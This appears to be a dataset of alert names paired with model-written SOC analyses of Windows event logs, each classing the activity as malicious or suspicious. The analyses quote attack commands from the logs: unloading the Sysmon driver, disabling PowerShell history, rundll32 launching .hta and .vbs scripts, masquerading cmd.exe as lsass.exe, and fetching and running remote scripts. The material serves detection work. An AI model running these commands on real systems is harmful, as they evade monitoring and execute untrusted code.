   - The event from **Sysmon** logs a driver communication failure, which could indicate disruption or manipulation of Sysmon operation, possibly pointing to tampering:
     - `C:\Windows\System32\cmd.exe` was used explicitly to unload the `SysmonDrv` through `fltMC.exe`.
     - Sysmon EventID 255 reflecting ""Failed to retrieve events"" further supports this tampering.

4. **Unusual Temporal Activity:**
   - There is a series of rapid executions in less than a second, pointing towards potentially automated or scripted execution rather than manual user actions. 

5. **Time Change Events:**
   - Multiple time alterations (Event ID 4616) are seen occurring, which could be benign but may also suggest attempts to tamper with event timestamps, often a red flag in forensic investigations to cover tracks.

#### Malicious Indicators:

- The combined use of PowerShell scripts, command-line utilities, and attempts to disable a security monitoring tool (Sysmon driver) are highly indicative of tampering and potential malicious activity.
  
- **Command Execution Line:**
  - Use of `cmd.exe` to unload security filters is especially concerning, pointing to an action to eliminate evidence or bypass security measures on the machine.

- **Short Time Frame for Actions:**
  - The quick succession of related logging activities and process creations reflect orchestration likely aiming to evade detection rapidly by manipulating monitoring tools.

### Assessment:

Based on the aforementioned points, this analysis indicates consistent use of administrative access to disable security monitoring on the system. The specific targeting of Sysmon is indicative of an attempt to evade detection, making the activity on the machine and the user's actions highly suspect.

### Conclusion:

**Resolution: MALICIOUS**

### Guidance:

1. **Immediate Actions:**
   - Contain the affected system to prevent further spread or damage.
   - Conduct a full forensic investigation to determine the extent of the compromise and identify additional indicators of compromise across the network.
   - Re-enable Sysmon or equivalent monitoring with enhanced auditing for future detections.

2. **Long-term Measures:**
   - Review and enforce least privilege access policies to limit the scope of activity such as this.
   - Enhance user awareness and conduct security training programs focused on recognizing the signs of compromised scripts or batch processes.
   - Strengthen endpoint detection with alert rules targeting process manipulation and filter tampering activities.

This combination of analysis and recommendations should ensure appropriate remediation steps are in place to address the detected malicious activity and mitigate future risks."
Service Registry Permissions Weakness,"After reviewing the logs provided for investigation regarding an alert on the CEO's machine, here is a detailed analysis of the activities captured in the logs:

### Detailed Analysis:

#### 1. **Windows PowerShell Log:**
   - The PowerShell commands executed (`get-acl` on registry paths, particularly on `HKLM\SYSTEM\CurrentControlSet\Services\*` and `weakservicename`) indicate an attempt to view permissions on system services, which can be indicative of reconnaissance activity aimed at identifying privileges.
   - Executing such commands can be a normal administrative action if done by authorized personnel. However, it can also be a precursor to privilege escalation if conducted by an unauthorized user or a script.

#### 2. **Application Log:**
   - Logs primarily indicate routine services like `Microsoft-Windows-Security-SPP` and `EdgeUpdate` being processed. The `Service stopped` entry for the `edgeupdate` doesn't particularly hint at malicious behavior unless correlated with other suspicious activities.

#### 3. **System Log:**
   - Contains entries about time adjustments which are handled by `svchost.exe`, and these adjustments appear to both set and correct the time. This might be suspicious if paired with unauthorized attempts to manipulate system time to evade logging.
   - These actions happening closely in proximity suggest possibly legitimate time-sync activities.

#### 4. **Sysmon Log:**
   - Numerous executions of system binaries like `whoami.exe`, `conhost.exe`, and `wevtutil.exe` by `SERVER002\admin_test` are captured. The use of `whoami` suggests a user querying their current identity and privileges.
   - `wevtutil` is used for managing event logs, which could be a normal action or an indication of attempts to clear event logs to remove traces.
   - The PowerShell activity corroborates the registry permission checking noted in the PowerShell logs. 
   - A series of entries related to `MicrosoftEdgeUpdate.exe` seem routine updates.

#### 5. **Security Log:**
   - Entries about time setting adjustments again involve `svchost.exe` and `LOCAL SERVICE`, likely correlating with the time synchronization noted in the system logs.

### Assessment:

- **Suspicious Indicators:**
  - The PowerShell commands executed can be a legitimate administrative action if conducted by IT personnel, but they are equally suspicious if conducted without appropriate context, especially when checking ACLs on services' registry keys.
  - The frequent usage of utilities like `whoami` and `wevtutil` in a relatively short time frame without identifying a clear legitimate administrative purpose raises suspicion.

- **Lack of Clear Malicious Activity:**
  - No explicit signs of malware execution, unknown or anomalous software, or definitive privilege escalation attempts besides the reconnaissance-oriented registry ACL viewing.
  - Logs do not show unrecognized executables or hashes that are typically associated with malware.

### Recommendation:

- **Resolution: SUSPICIOUS**
  - As PowerShell commands and queries like those found here can be indicative of reconnaissance, it's advised to conduct a further investigation. Examine the context under which the PowerShell scripts were executed and verify the legitimacy and intent behind such actions by `admin_test`.
  - Review access logs and other security measures, examine system privileges, and check if any unauthorized configurations or scheduled tasks were set.
  - If similar actions are unauthorized, monitor for further abnormal behaviors or deploy additional endpoint detection to cover possible escalations or lateral movement attempts."
Clear Event Logs via VBA,"Upon reviewing the provided event logs from different sources on the Windows host, several indicators of suspicious behavior stand out, particularly in relation to PowerShell execution and process creation:

1. **PowerShell Execution**:
   - The logs show multiple events pointing to the execution of PowerShell scripts using command-line arguments that involve downloading and executing a script from the internet (`https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1`), which is a common indicator of potentially malicious activity. This specific script seems to include parameters related to clearing logs, often indicative of a script aiming to hide tracks.

2. **Process Creation Events**:
   - Numerous Sysmon Event ID 1 entries indicate PowerShell, `HOSTNAME.EXE`, `whoami.exe`, `wevtutil.exe`, and other Windows utilities are being executed consecutively within a very short time span by the user `SERVER002\admin_test`. Such a rapid sequence of command-line executions is often associated with script-driven malicious behavior.
   - The execution of `wevtutil.exe`, which is used to clear logs, further supports the notion mentioned above of trying to clean evidence of activities.
 
3. **Suspicious Privileges**:
   - Security Event ID 4672 shows privileged rights being assigned to accounts, including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others, which might be leveraged to perform unauthorized actions.
  
4. **Unusual Logon Events**:
   - Event ID 4624 logs show SYSTEM logon sessions using `Advapi` with Logon Type 5, indicating a service logon, which is standard for system processes. However, given the context of other events, it maintains its relevance in the timeline of events.

5. **Network Activity During Logon**:
   - There are failed credential events (Event ID 5379) involving `MicrosoftAccount:user=02txoixylodcstop` and `WindowsLive:(token)` suggesting attempted access to remote resources or services, which could indicate lateral movement attempts.

**Assessment**:
- **Overall**, the combination of the above points strongly suggests that there is malicious activity taking place on the system. The use of PowerShell for script execution fetched from an untrusted source, in combination with tools to manipulate logs, indicates an attempt to obscure malicious operations.

**Resolution**:
- Based on the behaviors observed, I would classify the activities logged as **MALICIOUS**. The evidence strongly supports unauthorized and potentially harmful behavior that compromises the security posture of the system.

**Guidance on How to Proceed**:
- **Immediate Actions**:
  - Isolate the system from the network to prevent further potential spread or data exfiltration.
  - Conduct a forensic image collection of the affected machine for detailed offline analysis.
- **Long-Term Actions**:
  - Audit all user accounts and privileges for unauthorized changes.
  - Review firewall and IDS/IPS configurations to detect any similar activities.
  - Implement logging and alerting enhancements tailored to catch similar PowerShell or remote script execution activities in the future.
- **User Awareness and Training**:
  - Educate users on the dangers of executing unknown scripts.
  - Regularly reinforce policies on email attachments and unauthorized downloads."
Masquerading as Windows LSASS process,"# Analysis of Windows Event Logs

## Observations
1. **Repeated Credential Access Attempts (EventID 5379)**
   - Numerous attempts to access credentials from Microsoft accounts (e.g., `MicrosoftAccount:user=02txoixylodcstop`) with a return code of `3221226021`, indicating ""STATUS_LOGON_FAILURE"". The frequency and similarity of these events suggest an automated process or script attempting to gain access.

2. **Use of Command Line Tools (Sysmon EventID 1 and 5)**
   - The presence of tools such as `whoami.exe`, `cmd.exe`, and `conhost.exe` spawned with commands that copy and execute `cmd.exe` under the guise of `lsass.exe` is concerning. This indicates potential masquerading attempts to disguise malicious processes as legitimate Windows processes.

3. **PowerShell Activity (Sysmon logs)**
   - PowerShell is being used with `-ExecutionPolicy Restricted`, which is standard; however, the command `$Infs = Get-Item -Path ($env:WinDir + '\inf\*.inf')` might indicate attempts to list or manipulate installation files, which can be a pathway to exploit installation scripts or setups.

4. **Privileged Account Access (Security Log EventID 4672)**
   - The `admin_test` user account shows a set of high privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.). This indicates a high level of access which could be exploited if the account was compromised, or if a user with malicious intent used the account.

5. **Potentially Malicious Operation (Specifically Mentioned Programs and Activities)**
   - Specific Sysmon events show attempts to run processes that are not typical for routine system maintenance, such as repeated executions of `CompatTelRunner.exe` which is related to telemetry, often disabled due to privacy concerns.
   - The suspicious appearance of `cmd.exe` attempt using the `/B` flag to copy itself as `lsass.exe`, which is potentially indicative of credential dumping attempts or similar unauthorized activity.

6. **Software and Security Updates (System Log)**
   - The presence of multiple Windows Update operations, including Microsoft Edge updates and Windows Defender signatures, reflects a potentially benign environment where system services maintain security. However, their execution could be noise amidst suspicious activities, if conducted under the guise of legitimate processes.

## Assessment
The logs contain multiple indicators of possibly malicious activities:
- Unauthorized access attempts to Microsoft credentials repeatedly with failure.
- Use of command-line and PowerShell scripts in a potentially destructive or preparatory way to abuse system features.
- Execution attempts to use Windows services for operations that are potentially harmful if improperly leveraged (cmd-line executions mimicking system processes).

## Resolution
**MALICIOUS**

## Guidance on Next Steps
1. **Immediate Mitigation:**
   - Isolate the affected system from the network to prevent further unauthorized access.
   - Reset credentials for `admin_test` and other sensitive accounts involved.
   - Conduct a thorough security check on the system to identify any implants, unauthorized installations, or persistent threats.
   
2. **Further Investigation:**
   - Collect evidence and refine indicators of compromise for further monitoring on network activity for this and other systems.
   - Investigate all administrative actions conducted under the `admin_test` account.
   - Review EDR alerts and cross-check against the system's security events during the noted times.

3. **Long-term Measures:**
   - Consider engaging a forensic expert to analyze potential breaches.
   - Assess and potentially strengthen network and endpoint security configurations, including but not limited to implementing least privilege principles and monitoring administrative accounts more rigorously.
   - Educate users on credentials management to avoid reuse and susceptibility to phishing or brute-force attacks.

The logs provide a concerning picture of potential exploitation attempts; caution and a swift response are advised to mitigate risks associated with these findings."
Set Custom AddToHistoryHandler to Avoid History File Logging,"Upon reviewing the Windows event logs provided, here is a breakdown of findings and assessment:

### Analysis:

1. **Sysmon Events:**
   - **Process Execution Patterns**: A number of system utilities, such as `whoami.exe`, `conhost.exe`, `wevtutil.exe`, `powershell.exe`, are executed under the user `SERVER002\admin_test`. These are standard Windows executables, but their usage context can differ. 
   - **PowerShell Activity**: A PowerShell command was executed using `Set-PSReadLineOption -AddToHistoryHandler { return $false }`. This could potentially indicate an attempt to manipulate or disable command history logging, which is a noted tactic used in malicious activities to evade detection.
   
2. **Command-Line Arguments and Context:**
   - The Window’s Sysmon log displays instances of `powershell.exe` being executed with the intent to not log its history. While PowerShell is a legitimate administration tool, combined with the suppression of history logging, it is suspicious and indicative of stealthy behavior.

3. **Edge Update Activities:**
   - There are numerous events related to Microsoft Edge updates. While constant updates and checking are normal behavior for browser components, the frequency and clustering within a short timeframe can sometimes warrant closer examination. However, the logs indicate standard operations related to Microsoft Edge updating processes.

4. **User and Integrity Level:**
   - All activities performed by `SERVER002\admin_test` occurred at a High Integrity Level, suggesting that this account holds administrative privileges. Such privilege levels being exploited alongside suspicious activity raises the risk assessment.

### Assessment:

- **Suspicious Activity**: The PowerShell activity is particularly concerning. The use of `Set-PSReadLineOption` to alter command history behavior suggests an attempt to conceal further command usage. This technique is often employed in malicious scenarios where attackers attempt to execute commands without leaving traces.
  
- **Further Context Needed**: While Sysmon logs give insight into the processes being activated, they do not provide context on what was executed within PowerShell or what the intention was with other executables launched.

### Recommendation:

- **Resolution: SUSPICIOUS**

This activity merits further investigation. It is recommended to:
  
  - Conduct a forensic investigation on the machine to determine the content and intent of the PowerShell commands executed.
  - Review other related logs or artifacts, such as file access logs, network activity correlated to timestamps, and any alerts generated by network-based intrusion detection systems.
  - Check user access patterns, particularly for `admin_test`, to ascertain if unauthorized access or out-of-pattern behavior has occurred.
  - Run an antivirus and threat-hunting tool on the involved host to ascertain any changes or artifacts left by potentially malicious executables.
  
- **Immediate Actions:**

  - Monitor the user account `admin_test` and machine `Server002` closely for further anomalous activities.
  - Temporarily restrict administrative credentials if not business-critical to prevent potential escalation during investigations.

Completing these actions will help determine if this is truly harmful or if the logs represented benign activities given some unique setup or update scenario."

**Sysmon Log Analysis:**

1. **Repeated Use of `wevtutil.exe`:** 
   - There are multiple instances where `wevtutil.exe` is executed under the user ""SERVER002\\admin_test"". `wevtutil.exe` is a legitimate Windows command-line utility used to manage Windows Event logs, and its frequent usage is not inherently malicious. However, it could be used maliciously for dumping or clearing logs as part of an attempt to hide malicious activities.
   - **Process IDs:** 432, 1164, 1736, 2044, 2704, 1672

2. **Command-Line Execution via `cmd.exe`:**
   - A potentially concerning command from `cmd.exe` is observed:
     - `cmd.exe /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoLogOff /t REG_DWORD /d 1 /f & reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v StartMenuLogOff /t REG_DWORD /d 1 /f`
     - This indicates a modification of registry settings related to the ""LogOff"" policy for the explorer, which may be an attempt to alter user session settings in a subtle manner, possibly for persistence or to delay log off events.
   - **Process ID:** 4636

3. **Execution of System Utilities:**
   - The usage of standard Windows utilities like `hostname.exe`, `whoami.exe`, and `conhost.exe` are noted, which are generally benign as they are associated with determining network information and console management. However, in some contexts, they can be used in recon activities.
   - The frequent use of `conhost.exe` as a common parent process is not unusual but should be noted given the context of other activities.

4. **Execution of EdgeUpdate Processes:**
   - The logs include activities from Microsoft’s Edge Update service, which appears to be operating under its normal update cycle.
   - **Process IDs:** 4896, 5092, 4860; these denote the service running as intended under the correct context (""NT AUTHORITY\SYSTEM"").

5. **Potential Persistence Mechanism via Registry Changes:**
   - The execution of `reg.exe` to modify registry settings could indicate suspicious behavior:
     - **Commands:** Reg add for ""NoLogOff"" and ""StartMenuLogOff"" indicate potential unauthorized persistence or user session behavior alteration.
   - **Involved Process IDs:** 2568, 2524

**Application Log:**
- ""Service stopped"" entry from `edgeupdate` appears normal, indicating the service lifecycle status post-update cycle or action. 

**Security and System Logs:**
- Both logs appear to be missing or empty, which might indicate evasion tactics. Further investigation should be conducted to understand their status.

**Windows PowerShell Log:**
- No entries found here, suggesting limited direct console interaction through PowerShell, which is commonly used for administrative scripting.

Extract binary files via VBA,"After analyzing the provided logs, several indicators of potentially malicious activity stand out:

### Analysis:

1. **PowerShell Activity:**
   - The PowerShell logs contain events indicating the execution of a PowerShell script with potentially harmful command-line arguments. Specifically, the script:
     - Reads a file `data-macrocode.txt` from a temporary directory.
     - Replaces certain strings in the macro code (`aREPLACEMEa` with a path to a binary file `extractme.bin`).
     - Downloads and executes a script from a GitHub URL. This ""Invoke-Expression"" (`IEX`) along with ""Invoke-script"" potentially signals script execution that could harm the system or extract data without user consent.
   - The use of `Invoke-Expression` and downloading scripts from the internet, especially from public repositories like GitHub, is highly suspicious and often associated with malicious activities (e.g., running remote scripts, payload delivery).

2. **Sysmon Activity:**
   - Multiple processes are initiated using PowerShell as seen in Sysmon events. These include sequences involving `conhost.exe` and `wevtutil.exe`, both related to legitimate Windows operations, but in this context, they could serve as cover operations for malicious purposes.
   - The execution of `wevtutil.exe` and PowerShell commands at almost the same timestamp as the suspicious PowerShell activity raises concerns about log tampering or gathering.
   - The consistent use of high-integrity level and execution by `admin_test` account points to the possibility of privilege escalation or use of compromised account credentials.

3. **Network-based Indicators:**
   - The download from `raw.githubusercontent.com` suggests that the PowerShell script accesses external resources, which could mean connectivity to potential command and control servers.

### Assessment:

- Based upon the findings in the logs, there is a strong indication of hostile activities being undertaken, typical of a PowerShell-based attack:
  - **Remote script downloading and execution:** This is a common method for attackers to deploy additional payloads or establish persistence within the system.
  - **Usage of potentially compromised admin accounts** and running commands with high-integrity levels suggest privilege escalation attempts.

### Resolution: **MALICIOUS**

Given the analysis, the logs clearly indicate malicious activity. Immediate actions are necessary to secure the affected system.

### Recommendations:

1. **Immediate Actions:**
   - Disconnect the affected system from the network to prevent further potential damage or data exfiltration.
   - Perform a full malware scan and forensic investigation to understand the extent of the compromise.

   - Review and potentially reset privileged account credentials, especially `admin_test`.
   - Implement stricter PowerShell execution policies and monitor for similar activity in the future.
   - Strengthen EDR detections with specific rules against script-based downloads and executes from unknown online repositories.
   - Conduct security training and awareness for users, particularly on avoiding execution of unverified scripts."
Bypass UAC using SilentCleanup task,"### Analysis

Upon reviewing the provided Sysmon logs, several key observations arise:

1. **Repeated Execution of Utilities**:
   - A consistent pattern of the execution of the `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` processes by the user `SERVER002\admin_test` appears throughout the logs. 
   - The execution of legitimate utilities such as `hostname.exe` and `whoami.exe` could be benign in interactive sessions but their use in a sequence, especially if automated, can hint towards enumeration or reconnaissance activities typically seen in malicious behavior.

2. **Unusual Command Execution**:
   - The command `""cmd.exe"" /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.002\\src\\data.002.bat""` raises suspicion, as it indicates an execution of a batch file from a temporary directory. Batch files in temporary directories are often used in malicious scripts or during the execution of malware payloads.

3. **Software Updates**:
   - There are numerous entries related to Microsoft Edge Update processes running under the `NT AUTHORITY\SYSTEM`. These appear to be the automated update process for Edge and its background services.

### Suspicious or Anomalous Behavior

- **Command Execution in Temporary Directory**: The execution of a batch file within a `Temp` directory indicates potentially concerning behavior. It's common for malicious activities to execute scripts or binaries stored in these directories to evade detection.
  
- **Frequent Use of System Utilities**: The repeated execution of utilities (`whoami`, `hostname`) by `admin_test` could be a sign of script-based enumeration or reconnaissance activities often employed by adversaries to gather information about their environment.

### Assessment

Based on the given information, the activities reflected in the logs strongly suggest attempts to either discover or modify the system state through the use of Sysnative utilities and potentially malicious batch script execution. The use of `cmd.exe` to run scripts located in temporary directories can indicate the presence of post-exploitation or data exfiltration attempts, although this alone is not conclusive of a compromise without further supporting evidence.

### Guidance and Resolution

Given these findings, further investigation is warranted to ensure the security of the system:

1. **Analyze the Batch File**:
   - Obtain and analyze the contents of `data.002.bat` to understand its purpose and determine if it contains any malicious commands or indicators.

2. **Check for Related Activities**:
   - Review additional logs to find related network connections, file modifications, or other system changes that coincide with the timing of these events.
   
3. **User and Process Behavior**:
   - Look for similar events across other systems to assess whether this activity is isolated to `SERVER002` or part of a larger pattern.

4. **Validate Software Updates**:
   - Ensure that the Microsoft Edge Update processes are legitimate and not being employed as a cover for malicious activities.

5. **Restrict Administrator Activity**:
   - Validate and restrict the actions of the `SERVER002\\admin_test` user, ensuring their actions align with expected administrative activity.

### Resolution

The nature of the observed activities necessitates cautious examination. On balance, the assessment finds:
- **Resolution: SUSPICIOUS** - The logs show activity that needs further investigation to ascertain whether a compromise has occurred."
Invoke HTML Application - Simulate Lateral Movement over UNC Path,"## Detailed Analysis of the Logs

### Suspicious Behavior

Upon reviewing the event logs, the following suspicious behaviors have been identified:

1. **PowerShell Activity**:
   - There are multiple PowerShell events capturing the execution of commands via PowerShell, notably with a command line involving `Invoke-ATHHTMLApplication` and `mshta.exe`. This type of activity is commonly associated with script-based attacks or payload delivery techniques, as `mshta.exe` is frequently exploited by attackers to execute malicious code.

2. **Command Line Execution**:
   - The presence of `Invoke-ATHHTMLApplication` suggests the execution of a PowerShell script intended to deploy some kind of template application using `mshta.exe`.
   - The `CommandLine` observed in the Windows PowerShell log indicates potentially malicious PowerShell usage, as such obfuscation or utility usage is often seen in attacks attempting to bypass security controls.

3. **Sysmon Logs**:
   - Multiple instances of `powershell.exe`, `conhost.exe`, and utility processes like `wevtutil.exe` are executed by the user `SERVER002\admin_test`.
   - PowerShell activity being executed from a high-integrity context with `mshta.exe` involvement is a significant red flag.

4. **Wevtutil.exe Activity**:
   - The `wevtutil.exe` utility, often used to query and dump event logs, is frequently misused by attackers to cover their tracks after executing a payload. Here it is observed exporting logs to a temporary directory, which could align with an attempt to exfiltrate logs or clear evidence.

### Malicious Indicators

Given the nature of the PowerShell command observed and the repeated utilization of potentially malicious utilities, the following scenarios arise as indicators of malicious activity:

- **Use of `mshta.exe`**: This utility is known to be used in various attacks for executing scripts or HTML applications that can download or execute a payload.
- **Converging Utility Use**: The combination of PowerShell, `mshta.exe`, and `wevtutil.exe` usage in close sequence, especially by an administrative user (`admin_test`), presents a pattern often seen in lateral movement or privilege escalation tactics.
- **Log Dumping with `wevtutil.exe`**: Exporting logs to a temporary location can indicate preparation for either advanced analysis locally or unauthorized data collection for exfiltration.

### Assessment

- **Risk Assessment**: The convergence of PowerShell scripts with `mshta.exe` and exporting event logs suggests attempts at utilizing built-in Windows tools for potentially nefarious purposes, fitting a pattern that aligns with malicious activities. The observed behavior is characteristic of tactics used in ""living-off-the-land"" approaches, where attackers employ native system utilities to evade detection.
- **Security Threat Level**: High. There is substantial evidence supporting the likelihood of these actions representing a sophisticated attack or compromise attempt.

### Guidance

To proceed:

1. **Containment**: Immediately isolate `Server002` to prevent any further potential spread of malicious activity.
2. **Investigation**: Conduct a thorough investigation into any potential malicious scripts or artifacts associated with the user account `SERVER002\admin_test`.

Execution of HTA and VBS Files using Rundll32 and URL.dll,"Based on the provided logs, here is a detailed analysis of the potential indicators of malicious activity:

### Analysis of Logs:

#### 1. **Suspicious `CMD.exe` Execution:**
- In the Sysmon logs, particularly `EventRecordID` 17983 to 17985, there is a `cmd.exe` process executing a command with `rundll32.exe` that opens a URL and another `rundll32.exe` process that handles a `.vbs` file located in a temporary directory. This behavior is often indicative of a script attempting to execute potentially malicious code or payloads.
- The command line used is: `""cmd.exe"" /c rundll32.exe url.dll,OpenURL ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.011\\src\\index.hta"" & rundll32.exe URL.dll,FileProtocolHandler ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.011\\src\\akteullen.vbs""`
- The use of `rundll32.exe`, particularly with `hta` and `vbs` files, is a known technique for executing malicious scripts through a seemingly legitimate application, often used for initial code execution in malware campaigns.

#### 2. **Frequent Execution of `wevtutil.exe` and `conhost.exe` by `admin_test`:**
- Multiple instances of `wevtutil.exe` and `conhost.exe` being executed in succession are recorded under Event IDs 17956 to 17990. This behavior by the user `SERVER002\\admin_test` can indicate attempts to query or modify event logs, potentially to cover tracks of malicious activity.

#### 3. **Integrity Level:**
- The suspicious `cmd.exe`, `rundll32.exe`, and related processes are executing with a high integrity level, which indicates that they have a greater level of access and can perform actions that lower integrity level processes cannot.

### Conclusion and Assessment:

- The usage of `cmd.exe` to initiate a chain of executions involving `rundll32.exe` targeting `.hta` and `.vbs` files in a temporary directory is a highly suspicious activity that aligns with a common method for delivering or executing malicious code.
- Coupled with the repeated use of `wevtutil.exe` and `conhost.exe`, there is a strong indication of attempts to manipulate logs or automate tasks that could relate to malicious intent.
- Given the nature of the activities observed in the logs, there is a substantial risk that the system has potentially been compromised or is in the process of being exploited for malicious purposes.

### Resolution:

- **MALICIOUS**: The activities identified in the logs are consistent with known malicious techniques. These include suspicious command executions intended to download and execute scripts, potentially leading to a compromise.

### Recommended Actions:

1. **Immediate Containment:**
   - Isolate the affected host from the network to prevent any possible lateral movement or exfiltration of data.

2. **Further Investigation:**
   - Conduct a deep-dive forensic analysis on the affected machine, focusing on the processes, associated files, and any network connections that might have been established.

LOLBAS CustomShellHost to Spawn Process,"Upon thorough examination of the provided Windows event logs, several key observations indicate potential malicious activity:

1. **Use of System Utilities:**
   - The repeated use of `wevtutil.exe` and `conhost.exe` suggests possible log manipulation or interrogation. `Wevtutil.exe` is often used to query or clear event logs, especially in malicious activities to cover tracks.

2. **PowerShell Execution:**
   - The execution of PowerShell with the specified script is highly suspicious:
     - It checks if a directory `C:\test` exists, creates it if not, and then copies executable files (`customshellhost.exe` and `calc.exe`) to this directory, renaming `calc.exe` to `explorer.exe`.
     - Following this, it executes `customshellhost.exe`, which is potentially an unauthorized or malicious executable since it's being copied from `system32` without further context or necessity.
   - PowerShell is a powerful tool often used in attacks due to its flexibility in executing scripts unnoticed. The nature of this script fits the pattern of an attempt to run custom or unauthorized binaries.

3. **Usage of High-Integrity Processes:**
   - All these operations are executed with high integrity levels, indicating that an account with administrative privileges or similar is in use, which aligns with potential privilege escalation or abuse.

4. **Process Execution Patterns:**
   - The frequent execution of core system processes (`wevtutil`, `conhost`, `hostname`, `whoami`) in a rapid sequence implies an automated script or tool execution attempting reconnaissance or modification of the environment.

Given these observations, the behavior visible in the logs strongly aligns with known tactics used in compromising activities, particularly involving the manipulation or execution of unauthorized scripts and binaries.

### Recommendations:
- **Isolate the Machine:** Immediately isolate the concerned host (Server002) from the network to contain any potential spread of malicious software.
- **Conduct Further Forensic Analysis:** Obtain a full memory dump and disk image of the system for a deeper analysis to identify and eradicate any malicious tools or changes.
- **Review and Remediate:** Conduct a comprehensive review of access logs, installed applications, and potentially affected systems for any signs of further unauthorized activities or propagation.
- **Incident Response:** Initiate an incident response process in alignment with company policy to address the potential breach and prevent recurrence.
"
InfDefaultInstall.exe .inf Execution,"After thoroughly analyzing the provided Windows event logs across the Application, Sysmon, and Security channels from the machine ""Server002"", the following observations can be made:

### Overview and Key Observations:
1. **Microsoft Edge Update Activity:**
   - Multiple instances of the Microsoft Edge Update process (`MicrosoftEdgeUpdate.exe`) are observed executing various commands. While these may typically be part of legitimate update processes, there is an abnormal frequency and volume of execution, indicating potential abuse or misconfiguration.
   - The `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe` is executed and subsequently spawns child processes, which are repetitive in nature.

2. **Frequent Usage of `wevtutil.exe` and `conhost.exe`:**
   - Several invocations of `wevtutil.exe` and `conhost.exe` are made by an ""admin_test"" user within a very short time frame. While this might sometimes occur in normal circumstances, such as administrative tasks or automation scripts, the frequency and lack of command-line arguments attached make it a potential concern, suggesting this might be part of a script or automated task.

3. **Command-line Activity via `cmd.exe`:**
   - There is an execution of `cmd.exe` which appears to be installing a `.inf` file via `InfDefaultInstall.exe`. This particular activity should be further scrutinized, especially if the file and path seem unknown or unexpected.

4. **Security Log Entries:**
   - The logs indicate certain accounts gaining privileges that allow significant system-level actions, such as `SeDebugPrivilege`, `SeRestorePrivilege`, among others. This could be concerning if the context doesn't justify these elevated privileges.

### Assessment:
- The consistent and repeated execution of certain processes (`MicrosoftEdgeUpdate.exe`, `wevtutil.exe`, `conhost.exe`, `InfDefaultInstall.exe`) in a very tight timeframe is highly unusual and suggests automation or scripting. Although some might be part of legitimate updates or maintenance, the frequency and combination of these activities align more with behavioral patterns seen in scripts or potentially malicious scenarios.
- Furthermore, the command-line usage without accompanying context or detailed arguments raises a flag for potential misuse or misconfiguration.

### Conclusion:
**Resolution: SUSPICIOUS**

### Recommended Actions:
- **Further Investigation:**
  - Investigate the `InfDefaultInstall.inf` file and ensure it is from a trusted source. Check the path and the ownership of the directory from which it was run.
  - Review the `MicrosoftEdgeUpdate.exe` instances to confirm if they’re in line with expected update behavior or if deviances are present.
  - Check the legitimacy of the processes run by the ""admin_test"" user, especially those related to `wevtutil.exe` and `conhost.exe`, to ensure no rogue scripts or unauthorized actions.
  
- **Security Measures:**
  - Monitor for continued unusual behavior on this host, specifically regarding processes typical in exploits, such as those analyzed.
  - Consider implementing stricter controls on who can run scripts and which executables can execute arbitrary commands or touch sensitive system settings.

This log analysis underscores the importance of treating repetitive and quick successes of certain processes as potentially scripted or automated actions that warrant closer looked scrutiny."
Snake Malware Registry Blob,"Based on the analysis of the provided Windows event logs, several observations can be made to assess the situation:

### Suspicious or Anomalous Behavior:
1. **PowerShell Execution**:
   - The Windows PowerShell log entries reveal the execution of a script that writes binary data to the registry path `HKLM:\SOFTWARE\Classes\.wav\OpenWithProgIds` with the property name ""fileSnake"". This activity is particularly suspicious because it involves modifying the registry with seemingly random binary data, which can be indicative of malicious behavior such as registry persistence techniques often used by malware.
   - The command appears to generate random bytes and store them in a registry key, which could be part of a stealth mechanism for malicious payloads.

2. **Sysmon Logs**:
   - Multiple occurrences of process executions for `whoami.exe`, `conhost.exe`, and `wevtutil.exe` initiated by the user `SERVER002\admin_test` in rapid succession. While `whoami.exe` and `hostname.exe` are benign commands used to query system information, their frequent and closely timed execution can be considered suspicious if there is no legitimate explanation for such behavior.
   - The execution of `wevtutil.exe`, a command-line utility for managing event logs, may also be suspicious if used to clear logs or perform unauthorized actions.

3. **Lack of Context**:
   - The logs lack explicit indications about the source of the PowerShell script or the intention behind the operations. It is also unclear why such activities are being conducted on the CEO's machine.

### Malicious Indicators:
- The registry modification by the PowerShell script is the most concerning behavior found in the logs. Malicious scripts often employ such techniques to maintain persistence or obfuscate activities.

### Assessment:
The PowerShell activity, combined with the context and involved binary registry modification, strongly suggests suspicious behavior that requires further investigation to determine its legitimacy. Although some of the Sysmon events might be benign under different contexts, combined with the observed PowerShell activity, they heighten the suspicious nature of the operations.

### Resolution: SUSPICIOUS

### Guidance on How to Proceed:
1. **Immediate Investigation**:
   - Identify and question the purpose of the PowerShell script to verify its legitimacy, including reviewing any scheduled tasks or roles it might be associated with.
   - Conduct a thorough review of the user `SERVER002\admin_test` activities and their login patterns to verify if the usage aligns with legitimate administrative functions.
   
2. **System Integrity Check**:
   - Perform a deeper forensic analysis of the registry and scripts directory to uncover any potential remnants of the malware or unauthorized modifications.
   - Use anti-malware tools to scan for any known threats or anomalies.

3. **Network and Process Monitoring**:
   - Implement further monitoring on the CEO's machine to capture any unusual outbound connections or further suspicious process executions.
   - Review firewall and IDS/IPS logs to identify any lateral movement or external communication attempts.

   - Ensure appropriate segmentation and security policies are in place to limit the exposure of sensitive accounts and execute Least Privilege practices.

These measures will help determine if the activities are legitimate administrative tasks or part of a broader security incident."
Regsvr32 Silent DLL Install Call DllRegisterServer,"**Detailed Analysis:**

**Application Log:**
- The Application log entries indicate that Windows Defender is enabled and running correctly on the system (Event IDs 2386 and 2388).
- The Software Protection Platform Service logged an event signifying a normal operation (Event ID 2387). This doesn't suggest any anomaly or malicious behavior.

**System and Security Logs:**
- Both the System log and Security log sections are devoid of any entries. 

**Sysmon Log:**
- The Sysmon log entries provide extensive details on process creation and action logs. Key points of note in the logs:
  - A PowerShell process (ProcessId 6328) was executed by an account with the username ""SERVER002\\admin_test"" (EventRecordID 17987). PowerShell can be leveraged for legitimate administration tasks, but its use might indicate malicious activity if unauthorized.
